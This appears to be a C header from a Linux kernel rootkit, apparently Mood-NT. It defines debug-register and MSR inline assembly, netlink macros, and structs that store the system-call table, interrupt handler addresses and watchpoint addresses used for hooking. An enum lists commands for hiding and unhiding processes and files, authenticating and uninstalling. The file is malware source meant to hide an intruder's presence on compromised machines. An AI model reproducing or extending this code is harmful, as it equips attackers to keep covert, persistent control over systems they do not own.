#include <prefs.h>
#define	MOOD_STANDARD		1
#define MOOD_LEGACY		2
#define MOOD_ELITE		3
#define PID_MAX			0x8000
#define PF_NET			0x00000001
#define SEEK_SET       		0       /* Seek from beginning of file.  */
#define SEEK_CUR       		1       /* Seek from current position.  */
#define SEEK_END       		2       /* Seek from end of file.  */
#define KERNEL_DS		0xffffffff
#define TCP			0
#define	UDP			1
#define RAW			2
#define UNIX			3
#define NULL 			(void*)0
#define PROT_RWX        	0x7
#define PROT_WRITE 		0x2
#define MAP_PRIVATE     	0x22
#define MAP_SHARED      	0x1
#define O_NOCTTY           	0400
#define O_NONBLOCK		04000
#define O_RDONLY		00
#define O_CREAT 		0100
#define O_APPEND 		02000
#define O_WRONLY 		01
#define SIOCGIFFLAGS		0x00008913
#define SIOCSIFFLAGS		0x00008914
#define	TCFLSH 			0x540B
#define TIOCGPGRP		0x540F
#define IFF_PROMISC		0x100
#define SYS_SETSOCKOPT 		14
#define SYS_RECVMSG 		17
#define AF_NETLINK		16
#define GFP_KERNEL4	0x1f0
#define __GFP_HIGHMEM	(0x02 | 0x10 | 0x0)
#define __PAGE_KERNEL	(0x001 | 0x002 | 0x040 | 0x020)
#define NLMSG_ALIGNTO   4
#define NLMSG_ALIGN(len) ( ((len)+NLMSG_ALIGNTO-1) & ~(NLMSG_ALIGNTO-1) )
#define NLMSG_LENGTH(len) ((len)+NLMSG_ALIGN(sizeof(struct nlmsghdr)))
#define NLMSG_SPACE(len) NLMSG_ALIGN(NLMSG_LENGTH(len))
#define NLMSG_DATA(nlh)  ((void*)(((char*)nlh) + NLMSG_LENGTH(0)))
#define NLMSG_NEXT(nlh,len)      ((len) -= NLMSG_ALIGN((nlh)->nlmsg_len), \
                                  (struct nlmsghdr*)(((char*)(nlh)) + NLMSG_ALIGN((nlh)->nlmsg_len)))
#define NLMSG_OK(nlh,len) ((len) > 0 && (nlh)->nlmsg_len >= sizeof(struct nlmsghdr) && \
                           (nlh)->nlmsg_len <= (len))
#define NLMSG_PAYLOAD(nlh,len) ((nlh)->nlmsg_len - NLMSG_SPACE((len)))

#define NLMSG_NOOP              0x1     /* Nothing.             */
#define NLMSG_ERROR             0x2     /* Error                */
#define NLMSG_DONE              0x3     /* End of a dump        */
#define NLMSG_OVERRUN           0x4     /* Data lost            */
/* Arcane feature defines */
#define DR_MAX			4
#define DR_PROTECT		0x2000
#define DR7_DR0_LGLOB		0x3
#define DR7_DR1_LGLOB		0xc
#define DR7_DR2_LGLOB		0x30
#define DR7_DR3_LGLOB		0xc0

#define RESET_DR7(dr, regnum) dr &= ~(3UL << regnum*2)

#define DR_TRAP_MASK           0xF

#define DR_TYPE_EXE	       0x0
#define DR_TYPE_WRITE          0x1
#define DR_TYPE_IO             0x2
#define DR_TYPE_RW             0x3
#define MSR_IA32_SYSENTER_EIP 0x176

#define get_dr(regnum, val) \
               __asm__ volatile ("movl %%db" #regnum ", %0"  \
                       :"=r" (val))
#define set_dr(regnum, val) \
               __asm__ volatile ("movl %0,%%db" #regnum  \
                       : /* no output */ \
                       :"r" (val))
#define NOTIFY_DONE             0x0000          /* Don't care */
#define NOTIFY_OK               0x0001          /* Suits me */
#define NOTIFY_STOP_MASK        0x8000          /* Don't call further */
#define NOTIFY_STOP             (NOTIFY_OK|NOTIFY_STOP_MASK)
#define rdmsr(msr,val1,val2) \
	__asm__ __volatile__("rdmsr" \
			  : "=a" (val1), "=d" (val2) \
			  : "c" (msr))

#define wrmsr(msr,val1,val2) \
	__asm__ __volatile__("wrmsr" \
			  : /* no outputs */ \
			  : "c" (msr), "a" (val1), "d" (val2))

extern void code_start();
extern void code_end();
struct net
{
	int fd;
	unsigned long pos;
	unsigned long datalen;
	unsigned char *data;
	char magic;

}__attribute__((packed));
/*
struct task_net
{
	unsigned long 	flags;
	unsigned long 	pid;
	int		fd;
	struct net    	*net;
}__attribute__((packed));
*/
enum { uninstall=99, auth, p_hide, p_unhide, hidefile, unhidefile };

struct dawn_command
{
	int command;
	unsigned long pid;
	unsigned long key;
};
struct kernel_symbol
{
	        unsigned long value;
	        const char *name;
};

struct start_arg
{
	unsigned long 	kernel_mem; 		/* memory allocate through vmalloc */
	unsigned long	sys_call_table;		/* address of sys call table */
	unsigned short	kernel_version;		/* 6 = 2.6 4 = 2.4 */
	unsigned short	kernel_subversion;	/* 2.4.? or 2.6.? */
	unsigned long	vmalloc;		/* address of vmalloc */
	unsigned long   stacksize;		/* 4096 or 8192? */
	unsigned long	printk;			/* printk addr */
	unsigned long	int80;			/* address of int80 handler */
	unsigned long 	int1;			/* address of int1 handler */
	unsigned char   mycomm[16];		/* our program's name */
	unsigned long	smp_func;		/* smp_call_function* address */
	unsigned long	magic_address;		/* address of the watchpoint */
	unsigned long	magic_ptrace_address;	/* address of the watchpoint in 2.4's tracesys */
	unsigned long   magic_ptrace_rejoin;	/* address of the ret after watchpoint in 2.4's tracesys */
	unsigned long	magic_rejoin;		/* address of the ret after the watchpoint */
	unsigned long	notifier;		/* address of register_die_notifier */
	unsigned long   do_debug;		/* address of the do_debug function */
	unsigned long	kstart,kend;		/* base start address of kernel space and our stop limit */
	unsigned long	key;			/* mood-nt's key */
	unsigned char	mode;			/* mood-nt's forced engine */
	unsigned char	regparm;		/* is regparm activated? */
};

struct symtable
{
	unsigned char *names[10];
	unsigned long values[10];
	unsigned short used;
};

struct utsname {
        char sysname[65];
        char nodename[65];
        char release[65];
        char version[65];
        char machine[65];
        char domainname[65];
};
struct mmaparg {
        unsigned long addr;
        unsigned long len;
        unsigned long prot;
        unsigned long flags;
        unsigned long fd;
        unsigned long offset;
};

